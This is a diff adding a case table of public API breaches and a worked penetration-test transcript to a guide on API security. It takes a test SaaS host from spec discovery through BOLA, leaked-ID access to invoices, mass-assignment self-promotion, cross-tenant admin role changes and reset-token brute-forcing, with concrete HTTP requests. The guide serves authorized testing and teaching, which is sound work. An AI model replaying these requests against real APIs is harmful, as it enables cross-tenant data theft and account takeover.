@@ -378,6 +378,24 @@ admin"). Redact real PII. Note the SAFE-PoC discipline you followed.
 
 ---
 
+## 20.9 Verified Real-World API Incidents (learn the pattern → find it on your target)
+
+> Every case below is **publicly documented** (breach report, researcher write-up, or news of record). Read each as *"endpoint → missing check → impact,"* then hunt the same shape. These are the cases the generic call-outs in §5–§9 refer to — with the specifics. Facts are as published; confirm the primary source before citing one.
+
+| # | Case (year) | OWASP-API class | What actually happened | Lesson for you |
+|---|---|---|---|---|
+| 1 | **Optus** (Sept 2022, AU; ≈9.5M customers) | **API2 broken auth + API1 BOLA** (CWE-306/639) | An internet-facing endpoint (`api.www.optus.com.au`) required **no authentication** and used **sequential customer identifiers** → a simple script walked the whole customer DB (names, DOB, addresses, phone, ID numbers). A 2018 coding error had silently disabled the access control. Regulatory/remediation fallout in the **tens of millions**. | The two deadliest bugs **stacked**: no auth + guessable IDs. Always test an endpoint **with no token** AND try incrementing the ID (§5, §6). |
+| 2 | **T-Mobile US** (Nov 2022–Jan 2023; **37M** accounts) | **API1 BOLA at scale** (CWE-639/213) | A single production **API** was abused for **≈6 weeks undetected** to pull 37M customers' name, billing address, email, phone, DOB, account number and plan data — one object at a time, at scale. | A BOLA that returns *one* record returns *all* of them in a loop. Quantify scope in your report; that's what makes it Critical (§16). |
+| 3 | **"Web Hackers vs. The Auto Industry"** — Curry, Rivera, et al. (Jan 2023; 16+ makers) | **API1 BOLA + API5 BFLA → physical impact** (CWE-639/862) | Broken authorization across telematics/SSO APIs let researchers, **using only a car's VIN**, remotely **lock/unlock, start/stop the engine, locate, and pull owner PII** (Kia/Honda/Acura/Nissan/Infiniti), plus internal dealer/admin portals. | BOLA isn't just data — when the object is a **car/device/account action**, cross-user authz failure becomes **real-world control**. Look for the identifier (VIN, IMEI, serial) that the API trusts. |
+| 4 | **USPS "Informed Delivery / Informed Visibility" API** (Nov 2018; **≈60M** users; via Krebs) | **API1 BOLA + API5 BFLA-write** (CWE-639/862) | An **authenticated** API **accepted wildcards** in queries and lacked per-object authz → any usps.com account could **view (and in some cases modify)** ≈60M other users' account details. | "You must be logged in" ≠ authorized. Test **wildcards/operators** in filters (`*`, `%`, `[$ne]`) and whether **write** is scoped, not just read (§9, §15). |
+| 5 | **Experian partner-site API** (Apr 2021; Bill Demirkapi; via Krebs) | **API2 broken auth + API3 excessive data** (CWE-306/213) | A lender's site called an Experian API with **no authentication**; submitting a name+address and an **all-zeros date of birth** returned the person's **credit score + risk factors** for tens of millions of Americans. | A **third-party/partner** integration (API10) is your attack surface too. Probe default/empty/zero values in required fields — validation is often absent. |
+| 6 | **GitHub / Rails mass-assignment** (4 Mar 2012; Egor Homakov) | **API3 mass assignment** (CWE-915) — the origin case | An unchecked form parameter let Homakov **bind his public key onto the Rails committers list** and push to `rails/rails`; he also forged an issue dated year 3012. The class-defining "add the hidden field" bug. | Every `POST/PUT/PATCH` is a mass-assignment test: add `role`/`isAdmin`/`owner_id`/a foreign key the UI never sends, then **read it back** (§7.2). |
+| 7 | **Peloton API** (Jan–May 2021; Jan Masters / Pen Test Partners) | **API1 BOLA + API2 broken auth** (CWE-306/639) | **Unauthenticated** API requests returned users' private profile data (user/instructor IDs, location, weight, gender, age — even **birthday on profiles set to private**), ignoring the privacy setting. First "fix" didn't actually fix it. | Privacy settings enforced **only in the UI** are meaningless — hit the **raw API** and check whether "private" is enforced server-side (§7.1). Re-test after a vendor "fix." |
+
+**The recurring shape:** *find the endpoint whose server forgot to check **who's asking** (auth) or **what they may touch** (object/function authz), or that **binds/returns fields** it shouldn't → change one identifier, drop the token, add one hidden field, or submit an empty/wildcard value → cross-user/cross-tenant data, admin, ATO, or physical control.* Cases 1/5/7 are **missing authentication**; 2/3/4 are **BOLA/BFLA at scale**; 6 is **mass assignment**; 4/5 add **BFLA-write / excessive data**. Not one needed a memory-corruption exploit — just the two-account, ID-swap, hidden-field methodology in this guide.
+
+---
+
 ## 21. Appendix A — API discovery quick-hits
 ```
 Specs:   /openapi.json /swagger.json /v3/api-docs /api-docs /swagger-ui.html /redoc /docs /postman
@@ -417,6 +435,107 @@ Burp **Autorize**/**AuthMatrix** automate exactly this (replay A's traffic with 
 
 **Companion kits in this repo** (cross-referenced throughout — the API surface routes into these):
 `../../Web/IDOR/` · `../../Web/JWT/` · `../../Web/SSRF/` · `../../Web/SQLi/` · `../../Web/NoSQLi/` · `../../Web/CommandInjection/` · `../../Web/SSTI/` · `../../Web/LFI/` · `../../Web/LDAP/` · `../../Web/CORS/` · `../../Web/HostHeader/` · `../../Web/RaceCondition/` · `../../Web/FileUpload/` · `../../Web/JSFiles/` · `../../Web/Recon/` · `../GraphQL/` · `../../Mobile/Android/ADB/`.
+
+---
+
+## Appendix D — End-to-End Worked Transcript: from Swagger to tenant takeover
+
+> **The flagship.** One continuous engagement against an authorized multi-tenant SaaS API, at the **wire level** — every request and the response that drove the next move. It chains the API-signature bugs in yield order: **map (spec) → BOLA (two-account) → ID-leak → UUID BOLA → mass-assignment self-promote → BFLA admin function → cross-tenant takeover**, then a broken-auth → ATO variant. Accounts, org, and objects are **mine**; benign markers; writes reverted. This is the shape of §20.9 cases #1–#4 and #6, executed cleanly and safely.
+
+**Setup.** I register **two orgs I own**: **Org-A** (my attacker tenant) with user **A** (`hunter-a@myinbox.test`, role `member`), and **Org-B** (my victim tenant) with user **B** (`hunter-b@myinbox.test`). Goal: prove that from **A's** token I can reach **Org-B's** data and escalate to **admin**, i.e. a **cross-tenant takeover** — without touching any real customer. Burp + Autorize loaded; two browser profiles.
+
+### Step 0 — Map the API from its spec (§1.1)
+```http
+GET /v3/api-docs HTTP/2
+Host: api.saas.target.test
+```
+```json
+{ "openapi":"3.0.1", "paths": {
+  "/api/v2/users/{id}": {"get":{}, "patch":{}},
+  "/api/v2/orgs/{orgId}/invoices": {"get":{}},
+  "/api/v2/orgs/{orgId}/members": {"get":{}, "post":{}},
+  "/api/admin/users/{id}/role": {"put":{}},
+  "/api/v1/users/{id}": {"get":{}}          ← an OLD version is still routed (API9!)
+} }
+```
+I import this into Postman/Burp → the **entire** surface, including `/api/admin/*` the UI never shows and a **`/api/v1/`** left online (§13).
+
+### Step 1 — BOLA on a numeric object id, two-account proof (§5)
+As **B**, `GET /api/v2/users/me` → B's id is `7042`. Now authenticated as **A** (a member of a *different* org):
+```http
+GET /api/v2/users/7042 HTTP/2
+Authorization: Bearer <A_TOKEN>
+```
+```json
+{ "id":7042, "email":"hunter-b@myinbox.test", "phone":"+1-555-0199", "orgId":5001, "role":"member" }
+```
+**A's token returned B's record — across tenant boundaries.** The resolver checked *authenticated*, not *authorized*. **BOLA confirmed.** (Optus/T-Mobile shape, §20.9 #1/#2.) I read exactly this one cross-tenant record to prove it, then **stop** — no ID-space walk (§20).
+
+### Step 2 — Turn UUIDs into BOLA with an ID-leak (§5 sub-types, §16)
+The `invoices` objects use **UUIDs**, not integers — "unguessable." But the org **members list** over-returns:
+```http
+GET /api/v2/orgs/5001/members HTTP/2
+Authorization: Bearer <A_TOKEN>
+```
+```json
+[ { "userId":7042, "invoiceId":"b1f2-...-9ac", "email":"hunter-b@myinbox.test" }, ... ]
+```
+A's token lists **Org-B's** members *and* leaks their **invoice UUIDs** (excessive data exposure, §7.1). Now the "unguessable" BOLA is trivial:
+```http
+GET /api/v2/invoices/b1f2-...-9ac HTTP/2
+Authorization: Bearer <A_TOKEN>
+```
+```json
+{ "invoiceId":"b1f2-...-9ac", "amount":4200, "billingName":"...", "cardLast4":"4242" }
+```
+**ID-leak → UUID BOLA → cross-tenant financial data.** This is the killer chain #1 from §16 — a UUID doesn't save you when another endpoint hands you the id.
+
+### Step 3 — Mass-assignment self-promotion (§7.2)
+The profile-update `PATCH` is the mass-assignment sink. From the GET response the model has a `role` field; I add it to a write:
+```http
+PATCH /api/v2/users/7041 HTTP/2
+Authorization: Bearer <A_TOKEN>
+Content-Type: application/json
+
+{"name":"A","role":"org_admin","emailVerified":true}
+```
+```json
+{ "id":7041, "name":"A", "role":"org_admin", "emailVerified":true }
+```
+Re-GET confirms `role` **persisted** — the body was bound straight onto the model (GitHub-2012 shape, §20.9 #6). **A is now an org-admin.** Echo alone wouldn't count; the read-back + the new capability do (§17).
+
+### Step 4 — BFLA: use the new role on an admin-only function (§9)
+Admin role in hand, I call the **admin** endpoint the spec revealed — as a user who started as a plain member:
+```http
+PUT /api/admin/users/7042/role HTTP/2
+Authorization: Bearer <A_TOKEN>
+Content-Type: application/json
+
+{"role":"member","orgId":5001}
+```
+```json
+{ "id":7042, "orgId":5001, "role":"member", "updatedBy":7041 }
+```
+The admin function **accepted my call and acted on Org-B's user** — **BFLA across tenants** (`updatedBy:7041` = me). From here I can add myself to Org-B, change its members' roles, or export its data → **cross-tenant takeover**. (USPS wildcard-write / auto-industry BFLA shape, §20.9 #3/#4.) I perform the destructive proof **only on my own Org-B objects** and **revert** every change.
+
+### Step 5 — The broken-auth ATO variant (§6) — proven on my own account
+Independently, the password-reset flow trusts a body `email`:
+```http
+POST /api/v2/auth/reset HTTP/2
+Content-Type: application/json
+
+{"email":"hunter-b@myinbox.test"}          # I control B; in a real test this is MY OWN second account
+```
+The reset link's token is a short sequential integer (`?token=100418`) with **no rate limit** on `/auth/reset/verify` → I demonstrate the **brute primitive** with a measured count against **my own** account, never a stranger's. Reset-without-old-password + guessable token = **ATO primitive** (§6, Experian/broken-auth shape).
+
+### What went in the report (chained, impact-first)
+1. **Cross-tenant BOLA on `/api/v2/users/{id}` and `/invoices/{uuid}` → any tenant's PII + financial data** (Critical) — two-account proof, ID-leak documented, scope quantified but **not** exfiltrated.
+2. **Mass assignment via `PATCH /users` `role` → self-promotion to org-admin** (High/Critical) — persisted read-back, reverted.
+3. **BFLA on `PUT /api/admin/users/{id}/role` → act on another tenant's users → cross-tenant takeover** (Critical) — the headline.
+4. **Broken auth (guessable, unthrottled reset token) → ATO primitive** (High) — measured on my own account.
+5. **Enabler noted:** `/api/v1/` (API9) is still routed — I confirm the same BOLA is unpatched there too.
+
+**Why this transcript is the template:** every step converts a *capability* ("id returns data," "field echoed," "admin endpoint exists") into **cross-tenant impact, then admin, then takeover** — with the **two-identity proof** each authz bug requires (§17), benign markers, bounded reads, and reverted writes. Title by the **demonstrated** impact (§19), lead with the cross-tenant takeover, and quantify scope without pulling the whole ID space.
 
 ---
 
